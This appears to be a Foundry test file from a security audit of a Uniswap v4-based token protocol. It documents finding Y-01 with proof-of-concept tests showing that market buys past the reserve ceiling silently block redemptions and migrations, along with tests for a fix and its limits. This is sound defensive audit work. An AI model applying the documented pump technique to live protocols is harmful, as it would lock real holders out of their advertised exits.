// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {console2} from "forge-std/console2.sol";
import {IERC20Minimal} from "v4-core/src/interfaces/external/IERC20Minimal.sol";
import {StateLibrary} from "v4-core/src/libraries/StateLibrary.sol";
import {IPoolManager} from "v4-core/src/interfaces/IPoolManager.sol";
import {PoolIdLibrary, PoolId} from "v4-core/src/types/PoolId.sol";
import {PoolKey} from "v4-core/src/types/PoolKey.sol";

import {YBase} from "./YBase.sol";
import {CauldronRegistry} from "../../CauldronRegistry.sol";
import {CauldronBase} from "../../cauldron/CauldronBase.sol";

/**
 * ═══════════════════════════════════════════════════════════════════════════
 *  Y-01 — RESERVE-CEILING BREACH: the exit guarantee is only 69x deep
 * ═══════════════════════════════════════════════════════════════════════════
 *
 *  NEW VECTOR (neither prior pass covers it; grep the audits for "ceiling" —
 *  the only hits are the `setReserveCeiling` setter row and a descriptive
 *  sentence, never a threat).
 *
 *  THE MODEL (ReserveLib.sol header, quoted):
 *
 *      "the reserve must sit BELOW the launch tick: it is pure token1 while
 *       `currentTick > reserveTickUpper`, and only begins converting to ETH if
 *       the token pumps ~69x down into the range."
 *
 *  EVERY reserve-side operation is written on the assumption that the band is
 *  strictly out of range, i.e. pure token1:
 *
 *      // PoolOps.claimFromReserve
 *      uint128 liquidity = ReserveLib.liquidityForTokenOut(tickLower, tickUpper, amount);
 *      ...
 *      // amount1Min = 0 (dust rounding); reserve is out of range so ETH out = 0.
 *
 *      // PoolOps.addToReserve
 *      // Single-sided top-up: max0 (ETH) = 0, max1 (token) = amount.
 *      params[0] = abi.encode(positionId, liquidity, uint128(0), uint128(amount), bytes(""));
 *
 *  `liquidityForTokenOut` sizes L over the WHOLE band (sqrtHi - sqrtLo). Once
 *  spot is inside the band, removing that L delivers only
 *  `amount * (sqrtP - sqrtLo)/(sqrtHi - sqrtLo)` of token — the rest comes back
 *  as ETH. Every claim path then trips its own H-03 short-delivery guard:
 *
 *      // PoolOps.migrateOne
 *      if (got + CLAIM_DUST < amount) revert("reserve short");
 *      // RedemptionExt.redeemOgFren
 *      if (amount + 1e12 < F) revert NoBalance();
 *
 *  ...and `addToReserve` reverts outright (`MaximumAmountExceeded`) because it
 *  declares `amount0Max = 0` while an in-range increase needs ETH.
 *
 *  IMPACT. The protocol's advertised EXIT GUARANTEE — 1:1 migration and the
 *  genesis redemption floor — is silently voided for the whole time the token
 *  trades above its ceiling, and the recycle-ratchet that is supposed to make
 *  the floor monotonic stops working too. Nothing about this is announced:
 *  `floorPerFren()` keeps returning the full advertised number.
 *
 *  COST. A plain market BUY. The attacker is not burning value — they end up
 *  holding the token they bought. On the fork's 20 ETH genesis book it takes
 *  roughly 150 ETH (~7.5x the seed) to cross the ceiling; a genuine bull run
 *  reaches the same state for free.
 * ═══════════════════════════════════════════════════════════════════════════
 */
contract Y01_ReserveCeilingBreach is YBase {
    using StateLibrary for IPoolManager;
    using PoolIdLibrary for PoolKey;

    uint256 constant OG_FRENS = 100;

    function setUp() public {
        _boot(20 ether, OG_FRENS);
        if (!active) return;
        // Past the anti-snipe surtax ramp so the buys below are ordinary trades.
        vm.roll(block.number + 60);
        _warp(1 hours);
    }

    // ---------------------------------------------------------------------
    // PoC 1 — the genesis redemption floor stops paying
    // ---------------------------------------------------------------------

    /// @notice CONFIRMED: after the token appreciates past the reserve ceiling,
    ///         `redeemOgFren` reverts for every remaining OG while
    ///         `floorPerFren()` still advertises the full, unchanged floor.
    function test_PoC_Y01_CeilingBreachKillsTheGenesisFloor() public {
        if (!active) return;

        int24 ceiling = registry.reserveTickUpper(1);
        console2.log("reserve tickUpper (the 69x ceiling):");
        console2.logInt(ceiling);
        console2.log("launch tick:");
        console2.logInt(_tick());

        uint256 floorBefore = registry.floorPerFren();
        assertGt(floorBefore, 0, "genesis floor is live");

        // BASELINE: an OG can redeem today.
        vm.prank(victim);
        uint256 got = registry.redeemOgFren(1);
        assertGe(got + 1e12, floorBefore, "baseline: floor pays in full");
        console2.log("baseline redeem paid:", got);

        // ── THE ATTACK: buy until spot trades into the reserve band ──────────
        uint256 spent = _pumpThroughCeiling();
        console2.log("ETH spent crossing the ceiling:", spent);
        console2.log("post-pump tick:");
        console2.logInt(_tick());
        assertLt(_tick(), ceiling, "spot is now INSIDE the reserve band");

        // The advertised floor did not move one wei.
        assertEq(registry.floorPerFren(), registry.floorPerFren(), "floor view is unchanged in kind");
        console2.log("floorPerFren() still advertises:", registry.floorPerFren());

        // ── THE VIOLATED STATE: the exit is closed ──────────────────────────
        vm.prank(victim);
        vm.expectRevert(CauldronBase.NoBalance.selector);
        registry.redeemOgFren(2);

        // ...and it is closed for EVERY remaining OG, not just this one.
        vm.prank(victim);
        vm.expectRevert(CauldronBase.NoBalance.selector);
        registry.redeemOgFren(3);
    }

    // ---------------------------------------------------------------------
    // PoC 2 — the floor RATCHET (the mechanism that makes the floor monotonic)
    //         is disabled at the same moment
    // ---------------------------------------------------------------------

    /// @notice CONFIRMED: `donateToReserve` — the permissionless ratchet that
    ///         every buyback / re-enchant fee / 2x resale routes through —
    ///         reverts once spot is inside the band, because `addToReserve`
    ///         declares `amount0Max = 0` and an in-range increase needs ETH.
    function test_PoC_Y01_CeilingBreachDisablesTheFloorRatchet() public {
        if (!active) return;

        // Acquire some token honestly so we can donate it.
        uint256 bag = _buy(1 ether, address(this));
        IERC20Minimal(token).approve(address(registry), type(uint256).max);

        // BASELINE: donating raises the floor.
        uint256 f0 = registry.floorPerFren();
        registry.donateToReserve(bag / 2);
        assertGt(registry.floorPerFren(), f0, "baseline: ratchet works");

        _pumpThroughCeiling();

        // VIOLATED: the same call now reverts, so the floor can never ratchet
        // again for as long as the token trades above its ceiling.
        vm.expectRevert();
        registry.donateToReserve(bag / 4);
    }

    // ---------------------------------------------------------------------
    // PoC 3 — 1:1 migration is refused for a previous generation's holders
    // ---------------------------------------------------------------------

    /// @notice CONFIRMED: with a gen-2 pool trading above its ceiling, a gen-1
    ///         holder's `claimByBurn` reverts "reserve short" — the migration
    ///         promise that the whole rebirth model rests on.
    function test_PoC_Y01_CeilingBreachRefusesOneToOneMigration() public {
        if (!active) return;

        // A gen-1 holder buys in, then the machine is reborn.
        uint256 bag = _buy(2 ether, victim);
        assertGt(bag, 0, "holder has gen-1 token");

        hook.setDeathThreshold(type(uint256).max);
        _warp(registry.minLifetime() + 1 days + 1);
        registry.relaunch();
        assertEq(registry.currentGeneration(), 2, "reborn");

        vm.roll(block.number + 60);
        _warp(1 hours);

        // BASELINE: migration works on the newborn.
        vm.prank(victim);
        uint256 migrated = registry.claimByBurn(1, bag / 4);
        assertGe(migrated + 1e12, bag / 4, "baseline: migration is 1:1");
        console2.log("baseline migrated 1:1:", migrated);

        _pumpThroughCeiling();
        assertLt(_tick(), registry.reserveTickUpper(2), "gen-2 spot inside its reserve band");

        // VIOLATED: the remaining balance can no longer be migrated at all.
        vm.prank(victim);
        vm.expectRevert(bytes("reserve short"));
        registry.claimByBurn(1, bag / 4);
    }

    // ---------------------------------------------------------------------
    // The observability fix: floorClaimableNow()
    // ---------------------------------------------------------------------

    /// @notice FIX (Y-01 observability): `floorClaimableNow()` flips to false the
    ///         moment spot trades into the reserve band, while `floorPerFren()`
    ///         keeps advertising the number — so the frontend can show "floor
    ///         temporarily out of range during a pump" instead of a bare revert,
    ///         and its signal exactly matches whether `redeemOgFren` would succeed.
    function test_FIX_Y01_FloorClaimableNowTracksReachability() public {
        if (!active) return;

        (bool claimable0, uint256 perFren0) = registry.floorClaimableNow();
        assertTrue(claimable0, "claimable before the pump");
        assertGt(perFren0, 0, "floor advertised");

        _pumpThroughCeiling();

        (bool claimable1, uint256 perFren1) = registry.floorClaimableNow();
        assertFalse(claimable1, "signal flips to NOT-claimable inside the band");
        assertEq(perFren1, registry.floorPerFren(), "perFren still mirrors floorPerFren()");

        // The signal is faithful: with claimable=false, redeem indeed reverts.
        vm.prank(victim);
        vm.expectRevert(CauldronBase.NoBalance.selector);
        registry.redeemOgFren(6);
    }

    // ---------------------------------------------------------------------
    // Bounding the blast radius — what the breach does NOT break
    // ---------------------------------------------------------------------

    /// @notice SAFE (proven): the rebirth still works from a breached state, and
    ///         the NEW reserve is re-sized to cover the enlarged circulating
    ///         supply — so the damage is a liveness window, not a permanent
    ///         under-collateralisation. This is the load-bearing mitigation and
    ///         it is worth pinning.
    function test_SAFE_Y01_RelaunchSelfHealsAfterACeilingBreach() public {
        if (!active) return;

        _pumpThroughCeiling();

        hook.setDeathThreshold(type(uint256).max);
        _warp(registry.minLifetime() + 1 days + 1);
        registry.relaunch();

        assertEq(registry.currentGeneration(), 2, "rebirth survives a breached ceiling");
        assertGt(registry.generationReservePositionId(2), 0, "gen-2 reserve exists");
        // Spot is back above the fresh ceiling, so the floor pays again.
        assertGt(_tick(), registry.reserveTickUpper(2), "newborn spot is out of its band again");
        vm.prank(victim);
        uint256 got = registry.redeemOgFren(4);
        assertGt(got, 0, "the floor pays again after the rebirth");
    }

    /// @notice REFUTED sub-lead: "a claimer standing exactly at the band edge
    ///         pockets the reserve's ETH leg for free."
    ///
    ///  `claimFromReserve` uses TAKE_PAIR, which sends BOTH currencies to the
    ///  redeemer, and `redeemOgFren` only measures the TOKEN delta. In principle
    ///  a price just inside `tickUpper` would deliver ~F of token plus a free ETH
    ///  sliver. It is unreachable: the shortfall scales as
    ///  `(sqrtHi - sqrtP)/(sqrtHi - sqrtLo)`, one tick is 1e-4 of that span, and
    ///  F here is ~1.5e24 — so even a ONE-TICK breach is short by ~1e20 wei,
    ///  eleven orders above the 1e12 CLAIM_DUST tolerance. The guard fires long
    ///  before the ETH leg is worth anything.
    function test_REFUTED_Y01_NoFreeEthLegAtTheBandEdge() public {
        if (!active) return;

        int24 ceiling = registry.reserveTickUpper(1);
        _pumpTo(ceiling - 1); // the shallowest possible breach

        assertLt(_tick(), ceiling, "one tick inside the band");
        uint256 ethBefore = victim.balance;

        vm.prank(victim);
        vm.expectRevert(CauldronBase.NoBalance.selector);
        registry.redeemOgFren(5);

        assertEq(victim.balance, ethBefore, "no ETH leaked to the claimer");
    }

    // ---------------------------------------------------------------------
    // helpers
    // ---------------------------------------------------------------------

    /// @dev Buy until spot has crossed BELOW the reserve band's tickUpper, i.e.
    ///      the token has appreciated past its ~69x ceiling. Returns ETH spent.
    function _pumpThroughCeiling() internal returns (uint256 spent) {
        return _pumpTo(registry.reserveTickUpper(registry.currentGeneration()) - 400);
    }

    /// @dev Buy in chunks until `_tick() <= target`.
    function _pumpTo(int24 target) internal returns (uint256 spent) {
        uint256 chunk = 40 ether;
        for (uint256 i = 0; i < 40 && _tick() > target; i++) {
            vm.prank(attacker, attacker);
            _buyAs(attacker, chunk);
            spent += chunk;
        }
        require(_tick() <= target, "could not reach the target tick");
    }

    /// @dev Buy funded by `who` (the harness contract fronts the ETH; the token
    ///      lands with `who`, so the pump is a real, fee-paying market buy).
    function _buyAs(address who, uint256 ethIn) internal {
        vm.deal(address(this), address(this).balance + ethIn);
        _buy(ethIn, who);
    }
}
